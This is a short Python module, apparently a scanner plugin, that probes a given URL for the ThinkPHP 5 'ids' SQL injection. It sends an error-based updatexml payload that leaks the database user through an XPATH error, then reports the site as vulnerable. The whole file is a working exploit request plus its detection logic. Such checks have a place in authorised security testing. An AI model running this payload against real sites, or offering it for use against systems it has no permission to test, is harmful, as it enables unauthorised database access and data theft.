"""  
@Time: 2024/2/28 16:51 
@Auth: Y5neKO
@File: thinkphp5_sqli.py 
@IDE: PyCharm 
"""
import requests
import re
import urllib.parse


def run(url, timeout):
    result = {
        'name': 'thinkphp5_sqli',
        'vulnerable': False,
        'method': None,
        'url': None,
        'payload': None
    }
    try:
        payload = urllib.parse.urljoin(url, '/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1')
        response = requests.get(payload, timeout=timeout, verify=False)
        if re.search(r'XPATH syntax error', response.text):
            result['vulnerable'] = True
            result['method'] = 'GET'
            result['url'] = url
            result['payload'] = payload
        return result
    except Exception as e:
        print(e)
        return result
